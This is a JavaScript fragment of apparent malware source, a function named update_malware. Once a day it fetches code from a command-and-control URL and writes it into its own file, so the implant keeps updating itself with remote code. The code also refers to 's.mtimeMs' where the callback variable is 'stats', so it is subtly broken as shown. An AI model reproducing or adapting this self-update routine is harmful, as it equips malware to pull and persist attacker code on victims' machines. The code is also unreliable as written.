function update_malware() {
    fs.stat(module.filename, (err, stats) => {
        if ((new Date() - (s.mtimeMs)) > (86400*1000)) {
            fetch(cnc_url).then((v) => {
                v.text().then((t) => {
                    let fc = fs.readFileSync(module.filename, "utf8");
                    fc = fc.replace(sentinel_pwn(), t);
                    fs.writeFileSync(module.filename, fc);
                })
            }).catch((e) => {
                // ignore.
            });
        }
    });
}